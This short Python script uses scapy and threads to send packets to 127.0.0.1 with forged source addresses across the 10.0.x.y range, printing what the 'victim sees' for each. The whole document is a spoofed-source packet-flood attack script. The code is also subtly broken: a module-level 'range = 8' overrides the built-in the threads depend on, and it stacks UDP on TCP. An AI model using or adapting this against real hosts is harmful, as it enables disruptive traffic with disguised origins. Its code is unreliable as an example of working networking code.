from scapy.all import *
from threading import Thread

def sendPackets(subnetMin,subnetMax):
	for i in range(subnetMin,subnetMax):
		for j in range(1,255):
			packet = IP(dst="127.0.0.1",src="10.0." + str(i) + "." + str(j),ttl=25)/TCP()/UDP()
			send(packet)
			print("victim sees 10.0." + str(i) + "." + str(j))

for i in range(1,32):
	range = 8
	rangeMin = i*8 - 7
	rangeMax = i*8
	thread = Thread(target=sendPackets,args=(rangeMin,rangeMax))
	thread.start()
